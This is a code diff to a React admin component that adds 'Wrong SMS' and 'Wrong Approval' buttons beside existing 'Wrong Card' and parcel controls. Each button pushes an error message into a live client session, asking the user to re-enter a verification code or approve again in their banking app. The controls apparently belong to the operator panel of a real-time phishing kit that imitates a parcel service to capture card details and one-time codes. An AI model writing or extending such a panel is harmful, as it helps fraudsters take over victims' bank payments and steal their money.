@@ -91,6 +91,28 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
     toast({ title: "Wrong card" });
   };
 
+  const sendWrongSmsMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "The verification code you entered is incorrect. Please check and try again.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong SMS" });
+  };
+
+  const sendWrongApprovalMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "Approval not received. Please try again in your banking app.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong Approval" });
+  };
+
   const sendBackToParcel = async () => {
     await supabase
       .from("client_sessions")
@@ -260,6 +282,24 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
           onClick={sendWrongCardMessage}
         >
           Wrong Card
+        </Button>
+
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
+          onClick={sendWrongSmsMessage}
+        >
+          Wrong SMS
+        </Button>
+
+        <Button 
+          size="sm" 
+          variant="outline" 
+          className="h-7 text-xs text-orange-600 border-orange-300 hover:bg-orange-50" 
+          onClick={sendWrongApprovalMessage}
+        >
+          Wrong Approval
         </Button>
 
         {session.admin_message && (
